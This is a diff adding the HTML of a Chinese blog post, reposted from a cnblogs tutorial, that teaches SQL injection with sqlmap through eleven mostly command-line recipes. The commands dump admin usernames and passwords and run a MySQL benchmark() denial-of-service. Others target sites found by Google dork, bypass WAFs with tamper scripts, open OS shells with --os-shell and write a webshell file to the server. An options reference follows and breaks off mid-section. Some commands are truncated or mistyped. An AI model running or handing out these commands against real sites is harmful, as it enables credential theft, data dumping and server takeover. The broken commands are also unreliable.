@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="转自https:&#x2F;&#x2F;www.cnblogs.com&#x2F;ichunqiu&#x2F;p&#x2F;5805108.htmlSQLMAP注入教程-11种常见SQLMAP使用方法详解 sqlmap也是渗透中常用的一个注入工具，其实在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。今天把我一直以来整理的sqlmap笔记发布上来供大家参考">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap">
+<meta property="og:url" content="http://example.com/2019/04/22/sqlmap/index.html">
+<meta property="og:site_name" content="Erlee">
+<meta property="og:description" content="转自https:&#x2F;&#x2F;www.cnblogs.com&#x2F;ichunqiu&#x2F;p&#x2F;5805108.htmlSQLMAP注入教程-11种常见SQLMAP使用方法详解 sqlmap也是渗透中常用的一个注入工具，其实在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。今天把我一直以来整理的sqlmap笔记发布上来供大家参考">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-04-22T23:24:00.000Z">
+<meta property="article:modified_time" content="2019-09-11T03:37:15.473Z">
+<meta property="article:author" content="Erlee">
+<meta property="article:tag" content="sqlmap">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2019/04/22/sqlmap/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>sqlmap | Erlee</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Erlee</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2019/04/22/sqlmap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/erlee.png">
+      <meta itemprop="name" content="Erlee">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Erlee">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sqlmap
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-04-22 19:24:00" itemprop="dateCreated datePublished" datetime="2019-04-22T19:24:00-04:00">2019-04-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-09-10 23:37:15" itemprop="dateModified" datetime="2019-09-10T23:37:15-04:00">2019-09-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%95%99%E7%A8%8B/" itemprop="url" rel="index"><span itemprop="name">教程</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="转自https-www-cnblogs-com-ichunqiu-p-5805108-html"><a href="#转自https-www-cnblogs-com-ichunqiu-p-5805108-html" class="headerlink" title="转自https://www.cnblogs.com/ichunqiu/p/5805108.html"></a>转自<code>https://www.cnblogs.com/ichunqiu/p/5805108.html</code></h1><h1 id="SQLMAP注入教程-11种常见SQLMAP使用方法详解"><a href="#SQLMAP注入教程-11种常见SQLMAP使用方法详解" class="headerlink" title="SQLMAP注入教程-11种常见SQLMAP使用方法详解"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ichunqiu/p/5805108.html">SQLMAP注入教程-11种常见SQLMAP使用方法详解</a></h1><blockquote>
+<p>sqlmap也是渗透中常用的一个注入工具，其实在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。今天把我一直以来整理的sqlmap笔记发布上来供大家参考。</p>
+</blockquote>
+<h2 id="一共有11种常见SQLmap使用方法："><a href="#一共有11种常见SQLmap使用方法：" class="headerlink" title="一共有11种常见SQLmap使用方法："></a>一共有11种常见SQLmap使用方法：</h2><h3 id="一、SQLMAP用于Access数据库注入"><a href="#一、SQLMAP用于Access数据库注入" class="headerlink" title="一、SQLMAP用于Access数据库注入"></a>一、SQLMAP用于Access数据库注入</h3><h4 id="1-猜解是否能注入"><a href="#1-猜解是否能注入" class="headerlink" title="(1) 猜解是否能注入"></a>(1) 猜解是否能注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-猜解表"><a href="#2-猜解表" class="headerlink" title="(2) 猜解表"></a>(2) 猜解表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --tables</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-根据猜解的表进行猜解表的字段-假如通过2得到了admin这个表"><a href="#3-根据猜解的表进行猜解表的字段-假如通过2得到了admin这个表" class="headerlink" title="(3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)"></a>(3) 根据猜解的表进行猜解表的字段(假如通过2得到了<code>admin</code>这个表)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --columns -T admin</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-根据字段猜解内容-假如通过3得到字段为username和password"><a href="#4-根据字段猜解内容-假如通过3得到字段为username和password" class="headerlink" title="(4) 根据字段猜解内容(假如通过3得到字段为username和password)"></a>(4) 根据字段猜解内容(假如通过3得到字段为<code>username</code>和password)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --dump -T admin -C &quot;username,password</span><br></pre></td></tr></table></figure>
+
+<h3 id="二、SQLMAP用于Cookie注入"><a href="#二、SQLMAP用于Cookie注入" class="headerlink" title="二、SQLMAP用于Cookie注入"></a>二、SQLMAP用于Cookie注入</h3><p>(1) cookie注入，猜解表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --table --level 2</span><br></pre></td></tr></table></figure>
+
+<p>(2) 猜解字段，(通过1的表猜解字段，假如表为admin)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --columns -T</span><br></pre></td></tr></table></figure>
+
+<p>(3) 猜解内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --dump -T</span><br></pre></td></tr></table></figure>
+
+<h3 id="三、SQLMAP用于mysql中DDOS攻击"><a href="#三、SQLMAP用于mysql中DDOS攻击" class="headerlink" title="三、SQLMAP用于mysql中DDOS攻击"></a>三、SQLMAP用于mysql中DDOS攻击</h3><h4 id="1-获取一个Shell"><a href="#1-获取一个Shell" class="headerlink" title="(1) 获取一个Shell"></a>(1) 获取一个Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.159.1/news.php?id=1 --sql-shell</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-输入执行语句完成DDOS攻击"><a href="#2-输入执行语句完成DDOS攻击" class="headerlink" title="(2) 输入执行语句完成DDOS攻击"></a>(2) 输入执行语句完成DDOS攻击</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="四、SQLMAP用于mysql注入"><a href="#四、SQLMAP用于mysql注入" class="headerlink" title="四、SQLMAP用于mysql注入"></a>四、SQLMAP用于mysql注入</h3><p>(1) 查找数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.com/link.php?id=321&quot; --dbs</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-通过第一步的数据库查找表-假如数据库名为dataname"><a href="#2-通过第一步的数据库查找表-假如数据库名为dataname" class="headerlink" title="(2) 通过第一步的数据库查找表(假如数据库名为dataname)"></a>(2) 通过第一步的数据库查找表(假如数据库名为dataname)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname --tables</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-通过2中的表得出列名-假如表为table-name"><a href="#3-通过2中的表得出列名-假如表为table-name" class="headerlink" title="(3) 通过2中的表得出列名(假如表为table_name)"></a>(3) 通过2中的表得出列名(假如表为table_name)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name --columns</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="4-获取字段的值-假如扫描出id-user-password字段"><a href="#4-获取字段的值-假如扫描出id-user-password字段" class="headerlink" title="(4) 获取字段的值(假如扫描出id,user,password字段)"></a>(4) 获取字段的值(假如扫描出id,user,password字段)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name -C &quot;id,user,password&quot; --dump</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="五、SQLMAP中post登陆框注入"><a href="#五、SQLMAP中post登陆框注入" class="headerlink" title="五、SQLMAP中post登陆框注入"></a>五、SQLMAP中post登陆框注入</h3><p>(1) 其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件</p>
+<blockquote>
+<p>我们在使用<code>Sqlmap</code>进行<code>post</code>型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合<code>burpsuite</code>来使用<code>sqlmap</code>，用这种方法进行<code>post</code>注入测试会更准确，操作起来也非常容易。</p>
+</blockquote>
+<p>用<code>burpsuite</code>把这个<code>post</code>请求复制为txt, 我这命名为post.txt 然后把它放至sqlmap目录下</p>
+<p>运行sqlmap并使用如下命令：紧接着<code>p</code>的是制定的参数名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r post.txt -p id</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。</p>
+<p>注入点：<a target="_blank" rel="noopener" href="http://testasp.vulnweb.com/Login.asp">http://testasp.vulnweb.com/Login.asp</a></p>
+<p>几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass</p>
+<p>(2) 自动的搜索</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://testasp.vulnweb.com/Login.asp --forms</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>(3) 指定参数搜索</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://testasp.vulnweb.com/Login.asp --data &quot;tfUName=321&amp;tfUPass=321&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="六、SQLMAP中Google搜索注入"><a href="#六、SQLMAP中Google搜索注入" class="headerlink" title="六、SQLMAP中Google搜索注入"></a>六、SQLMAP中Google搜索注入</h3><p>inurl后面的语言是由自己定的</p>
+<p>注入过程中如果选y是注入，如果不是选n</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -g inurl:php?id=</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="七、SQLMAP中的请求延迟"><a href="#七、SQLMAP中的请求延迟" class="headerlink" title="七、SQLMAP中的请求延迟"></a>七、SQLMAP中的请求延迟</h3><p>参数 –delay –safe-freq</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --delay 1</span><br><span class="line">sqlmap --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --safe-freq 3</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="八、SQLMAP绕过WAF防火墙"><a href="#八、SQLMAP绕过WAF防火墙" class="headerlink" title="八、SQLMAP绕过WAF防火墙"></a>八、SQLMAP绕过WAF防火墙</h3><p>注入点:<a target="_blank" rel="noopener" href="http://192.168.159.1/news.php?id=1">http://192.168.159.1/news.php?id=1</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.159.1/news.php?id=1 -v 3 --dbs --batch --tamper &quot;space2morehash.py&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>space2morehash.py</code>中可以替换<code>space2hash.py</code>或者<code>base64encode.py</code>或者<code>charencode.py</code></p>
+<p>都是编码方式</p>
+<h3 id="九、SQLMAP查看权限"><a href="#九、SQLMAP查看权限" class="headerlink" title="九、SQLMAP查看权限"></a>九、SQLMAP查看权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.159.1/news.php?id=1 --privileges</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="十、SQLMAP伪静态注入"><a href="#十、SQLMAP伪静态注入" class="headerlink" title="十、SQLMAP伪静态注入"></a>十、SQLMAP伪静态注入</h3><h4 id="1-查找数据库"><a href="#1-查找数据库" class="headerlink" title="(1) 查找数据库"></a>(1) 查找数据库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --dbs</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-通过1中的数据库查找对应的表-假如通过1，得到的是dataname"><a href="#2-通过1中的数据库查找对应的表-假如通过1，得到的是dataname" class="headerlink" title="(2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)"></a>(2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`python sqlmap.py ``-``u ``&quot;http://xxx.cn/index.php/Index/view/id/40.html&quot;` `-``D dataname ``--tables`</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-通过2中的数据表得到字段-假如得到的是tablename表"><a href="#3-通过2中的数据表得到字段-假如得到的是tablename表" class="headerlink" title="(3) 通过2中的数据表得到字段(假如得到的是tablename表)"></a>(3) 通过2中的数据表得到字段(假如得到的是tablename表)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname --tables</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="4-通过3得到字段值-假如从3中得到字段id，password"><a href="#4-通过3得到字段值-假如从3中得到字段id，password" class="headerlink" title="(4) 通过3得到字段值(假如从3中得到字段id，password)"></a>(4) 通过3得到字段值(假如从3中得到字段id，password)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -T</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="十一、SQLMAP注入点执行命令与交互写shell"><a href="#十一、SQLMAP注入点执行命令与交互写shell" class="headerlink" title="十一、SQLMAP注入点执行命令与交互写shell"></a>十一、SQLMAP注入点执行命令与交互写shell</h3><h3 id="1-注入点：http-192-168-159-1-news-php-id-1"><a href="#1-注入点：http-192-168-159-1-news-php-id-1" class="headerlink" title="(1) 注入点：http://192.168.159.1/news.php?id=1"></a>(1) 注入点：<a target="_blank" rel="noopener" href="http://192.168.159.1/news.php?id=1">http://192.168.159.1/news.php?id=1</a></h3><p>此处采用的是Linux系统</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.159.1/news.php?id=1 --os-cmd=ipconfig</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>出现语言的选择根据实际的测试网站选择语言</p>
+<p>指定目标站点D:/www/ </p>
+<p>(2) 获取Shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.159.1/news.php?id=1 --os-shell</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>出现语言的选择根据实际的测试网站选择语言</p>
+<p>指定目标站点D:/www/</p>
+<p>输入ipconfig/all</p>
+<p>创建用户和删除用户</p>
+<p>只要权限足够大，你可以输入使用任何命令。</p>
+<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h2><p>从数据库中搜索字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在<code>dedecms</code>数据库中搜索字段<code>admin</code>或者<code>password</code>。</p>
+<p>读取与写入文件</p>
+<p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
+<p><code>–file-read=RFILE</code> 从后端的数据库管理系统文件系统读取文件 （物理路径）</p>
+<p><code>–file-write=WFILE</code> 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p>
+<p><code>–file-dest=DFILE</code> 后端的数据库管理系统写入文件的绝对路径</p>
+<p>#示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用shell命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>接下来指定网站可写目录：</p>
+<p>“E:\php\htdocs\dvwa”</p>
+<p>#注：<code>mysql</code>不支持列目录，仅支持读取单个文件。<code>sqlserver</code>可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</p>
+<h1 id="sqlmap详细命令："><a href="#sqlmap详细命令：" class="headerlink" title="sqlmap详细命令："></a>sqlmap详细命令：</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--is-dba 当前用户权限（是否为root权限）</span><br><span class="line">--dbs 所有数据库</span><br><span class="line">--current-db 网站当前数据库</span><br><span class="line">--users 所有数据库用户</span><br><span class="line">--current-user 当前数据库用户</span><br><span class="line">--random-agent 构造随机user-agent</span><br><span class="line">--passwords 数据库密码</span><br><span class="line">--proxy http://local:8080 代理</span><br><span class="line">--threads 10   线程加速)</span><br><span class="line">--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>Options（选项）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--version 显示程序的版本号并退出</span><br><span class="line">--h, –help 显示此帮助消息并退出</span><br><span class="line">--v VERBOSE 详细级别：0-6（默认为1）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Target（目标）：</p>
+<p>以下至少需要设置其中一个选项，设置目标URL。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--d DIRECT 直接连接到数据库。</span><br><span class="line">--u URL, –url=URL 目标URL。</span><br><span class="line">--l LIST 从Burp或WebScarab代理的日志中解析目标。</span><br><span class="line">--r REQUESTFILE 从一个文件中载入HTTP请求。</span><br><span class="line">--g GOOGLEDORK 处理Google dork的结果作为目标URL。</span><br><span class="line">--c CONFIGFILE 从INI配置文件中加载选项。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>Request（请求）：</p>
+<p>这些选项可以用来指定如何连接到目标URL。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">--data=DATA 通过POST发送的数据字符串</span><br><span class="line">--cookie=COOKIE HTTP Cookie头</span><br><span class="line">--cookie-urlencode URL 编码生成的cookie注入</span><br><span class="line">--drop-set-cookie 忽略响应的Set – Cookie头信息</span><br><span class="line">--user-agent=AGENT 指定 HTTP User – Agent头</span><br><span class="line">--random-agent 使用随机选定的HTTP User – Agent头</span><br><span class="line">--referer=REFERER 指定 HTTP Referer头</span><br><span class="line">--headers=HEADERS 换行分开，加入其他的HTTP头</span><br><span class="line">--auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)</span><br><span class="line">--auth-cred=ACRED HTTP身份验证凭据（用户名:密码）</span><br><span class="line">--auth-cert=ACERT HTTP认证证书（key_file，cert_file）</span><br><span class="line">--proxy=PROXY 使用HTTP代理连接到目标URL</span><br><span class="line">--proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）</span><br><span class="line">--ignore-proxy 忽略系统默认的HTTP代理</span><br><span class="line">--delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒</span><br><span class="line">--timeout=TIMEOUT 等待连接超时的时间（默认为30秒）</span><br><span class="line">--retries=RETRIES 连接超时后重新连接的时间（默认3）</span><br><span class="line">--scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式</span><br><span class="line">--safe-url=SAFURL 在测试过程中经常访问的url地址</span><br><span class="line">--safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>Enumeration（枚举）：</p>
+<p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。</p>
